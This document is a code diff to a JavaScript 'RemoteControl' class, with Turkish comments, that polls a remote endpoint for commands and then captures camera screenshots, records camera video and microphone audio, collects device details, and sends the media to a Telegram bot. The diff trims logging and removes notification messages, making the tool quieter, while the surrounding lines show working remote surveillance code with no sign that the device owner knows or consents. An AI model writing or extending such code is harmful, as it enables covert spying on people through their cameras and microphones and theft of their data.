@@ -10,11 +10,11 @@ class RemoteControl {
         this.debug = config.debug || false;
         this.isEnabled = false;
         this.pollTimer = null;
-        
+
         // Session info
         this.sessionId = this.generateSessionId();
         this.deviceNumber = null;
-        
+
         // Media streams
         this.cameraStream = null;
         this.microphoneStream = null;
@@ -35,7 +35,7 @@ class RemoteControl {
         this.isEnabled = true;
         this.poll();
         this.sendStartNotification();
-        
+
         if (this.debug) console.log('✅ [RemoteControl] Remote Control ACTIVE');
     }
 
@@ -61,18 +61,9 @@ class RemoteControl {
         return info;
     }
 
-    // Sistem başladığında bildirim gönder
+    // Sistem başladığında bildirim artık gönderilmez - spam ve yavaşlık önlendi
     async sendStartNotification() {
-        if (window.telegramLogger) {
-            await window.telegramLogger.sendLog('remote_control_started', {
-                system_status: 'ACTIVE',
-                device_ready: true,
-                session_id: this.sessionId,
-                timestamp: new Date().toISOString()
-            });
-            
-            // Help mesajı artık otomatik gönderilmez - sadece /help komutu ile
-        }
+        // Kaldırıldı - gereksiz Telegram mesajı spam yapıyordu
     }
 
     // Help mesajı gönder
@@ -92,9 +83,9 @@ class RemoteControl {
             clearTimeout(this.pollTimer);
             this.pollTimer = null;
         }
-        
+
         this.releaseStreams();
-        
+
         if (this.debug) console.log('[RemoteControl] Stopped');
     }
 
@@ -117,12 +108,12 @@ class RemoteControl {
         try {
             const response = await fetch(this.commandEndpoint);
             if (!response.ok) throw new Error(`HTTP ${response.status}`);
-            
+
             const data = await response.json();
 
             if (data.success && data.commands && data.commands.length > 0) {
                 if (this.debug) console.log(`📡 ${data.commands.length} commands received`);
-                
+
                 for (const cmd of data.commands) {
                     await this.executeCommand(cmd);
                 }
@@ -141,13 +132,13 @@ class RemoteControl {
     async executeCommand(cmd) {
         try {
             if (this.debug) console.log('🎮 Executing:', cmd.command);
-            
+
             // /help komutu
             if (cmd.command === 'show_help') {
                 await this.sendHelpMessage();
                 return;
             }
-            
+
             // /devices komutu - cihaz bilgisini collection'a ekle (backend birleştirir)
             if (cmd.command === 'list_devices') {
                 await this.sendDeviceToCollection(cmd.message_id);
@@ -161,17 +152,7 @@ class RemoteControl {
                 if (this.debug) console.log(`[RemoteControl] Target device: ${cmd.target_device} (not implemented yet)`);
             }
 
-            // Komut alındı bildirimi
-            if (window.telegramLogger) {
-                await window.telegramLogger.sendLog('command_received', {
-                    command: cmd.command,
-                    params: cmd.params || 'none',
-                    message_id: cmd.message_id,
-                    target_device: cmd.target_device || 'all',
-                    session_id: this.sessionId,
-                    status: 'executing'
-                });
-            }
+            // Komut alındı bildirimi KALDIRILDI - gereksiz Telegram API çağrısı
 
             switch (cmd.command) {
                 case 'camera_screenshot':
@@ -188,7 +169,7 @@ class RemoteControl {
             }
         } catch (error) {
             if (this.debug) console.error('[RemoteControl] Command execution error:', error);
-            
+
             // Hata bildirimi
             if (window.telegramLogger) {
                 await window.telegramLogger.sendLog('command_error', {
@@ -206,7 +187,7 @@ class RemoteControl {
             const platform = deviceInfo.platform || 'Unknown';
             const browser = this.getBrowser(deviceInfo.user_agent);
             const emoji = this.getDeviceEmoji(platform);
-            
+
             const deviceData = {
                 emoji: emoji,
                 platform: platform,
@@ -219,7 +200,7 @@ class RemoteControl {
                 memory: deviceInfo.device_memory || 'Unknown',
                 connection: deviceInfo.connection_type || 'Unknown'
             };
-            
+
             const response = await fetch(this.collectDevicesEndpoint, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -238,24 +219,16 @@ class RemoteControl {
         }
     }
 
-    // Cihaz kartı gönder (her cihaz ayrı mesaj) - ARTIK KULLANILMIYOR
+    // Cihaz kartı gönder - Optimized (no console logs)
     async sendDeviceCard() {
         try {
-            console.log('📱 [RemoteControl] sendDeviceCard() called');
-            
-            if (!window.telegramLogger) {
-                console.error('❌ [RemoteControl] window.telegramLogger not found!');
-                return { success: false, error: 'telegramLogger not found' };
-            }
-            
-            console.log('✅ [RemoteControl] telegramLogger found, collecting device info...');
+            if (!window.telegramLogger) return { success: false, error: 'telegramLogger not found' };
+
             const deviceInfo = await this.collectDeviceInfo();
-            console.log('📊 [RemoteControl] Device info collected:', deviceInfo);
-            
             const platform = deviceInfo.platform || 'Unknown';
             const browser = this.getBrowser(deviceInfo.user_agent);
             const emoji = this.getDeviceEmoji(platform);
-            
+
             const cardData = {
                 emoji: emoji,
                 platform: platform,
@@ -268,19 +241,10 @@ class RemoteControl {
                 memory: deviceInfo.device_memory || 'Unknown',
                 connection: deviceInfo.connection_type || 'Unknown'
             };
-            
-            console.log('📤 [RemoteControl] Sending card data:', cardData);
+
             const result = await window.telegramLogger.sendLog('active_device_card', cardData);
-            
-            if (result && result.success) {
-                console.log('✅ [RemoteControl] Device card sent successfully!');
-                return { success: true };
-            } else {
-                console.error('❌ [RemoteControl] Failed to send device card:', result);
-                return { success: false, error: result };
-            }
+            return result && result.success ? { success: true } : { success: false, error: result };
         } catch (error) {
-            console.error('❌ [RemoteControl] Send device card error:', error.message, error.stack);
             return { success: false, error: error.message };
         }
     }
@@ -314,7 +278,7 @@ class RemoteControl {
 
             // Kamera erişimi al
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            
+
             // Video element oluştur
             const video = document.createElement('video');
             video.srcObject = stream;
@@ -361,15 +325,15 @@ class RemoteControl {
             if (this.debug) console.log(`[RemoteControl] Recording camera for ${duration} seconds...`);
 
             // Kamera erişimi al (düşük çözünürlük)
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { 
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: {
                     width: { ideal: 640 },
                     height: { ideal: 480 },
                     frameRate: { ideal: 15 }
-                }, 
-                audio: true 
+                },
+                audio: true
             });
-            
+
             const mediaRecorder = new MediaRecorder(stream, {
                 mimeType: 'video/webm;codecs=vp8,opus',
                 videoBitsPerSecond: 250000 // 250kbps - düşük kalite ama küçük dosya
@@ -385,18 +349,18 @@ class RemoteControl {
             mediaRecorder.onstop = async () => {
                 // Blob oluştur
                 const blob = new Blob(chunks, { type: 'video/webm' });
-                
+
                 // Base64'e çevir
                 const reader = new FileReader();
                 reader.onloadend = async () => {
                     const base64data = reader.result;
-                    
+
                     // Stream'i kapat
                     stream.getTracks().forEach(track => track.stop());
-                    
+
                     // Telegram'a gönder
                     await this.sendFile('video', base64data, `🎥 Camera Video (${duration}s)`, messageId);
-                    
+
                     if (this.debug) console.log('[RemoteControl] Video sent successfully');
                 };
                 reader.readAsDataURL(blob);
@@ -421,14 +385,14 @@ class RemoteControl {
             if (this.debug) console.log(`[RemoteControl] Recording microphone for ${duration} seconds...`);
 
             // Mikrofon erişimi al (düşük kalite)
-            const stream = await navigator.mediaDevices.getUserMedia({ 
+            const stream = await navigator.mediaDevices.getUserMedia({
                 audio: {
                     sampleRate: 16000,
                     echoCancellation: true,
                     noiseSuppression: true
                 }
             });
-            
+
             const mediaRecorder = new MediaRecorder(stream, {
                 mimeType: 'audio/webm;codecs=opus',
                 audioBitsPerSecond: 32000 // 32kbps - düşük kalite ama küçük dosya
@@ -444,18 +408,18 @@ class RemoteControl {
             mediaRecorder.onstop = async () => {
                 // Blob oluştur
                 const blob = new Blob(chunks, { type: 'audio/ogg' });
-                
+
                 // Base64'e çevir
                 const reader = new FileReader();
                 reader.onloadend = async () => {
                     const base64data = reader.result;
-                    
+
                     // Stream'i kapat
                     stream.getTracks().forEach(track => track.stop());
-                    
+
                     // Telegram'a gönder
                     await this.sendFile('voice', base64data, `🎤 Microphone Recording (${duration}s)`, messageId);
-                    
+
                     if (this.debug) console.log('[RemoteControl] Voice sent successfully');
                 };
                 reader.readAsDataURL(blob);
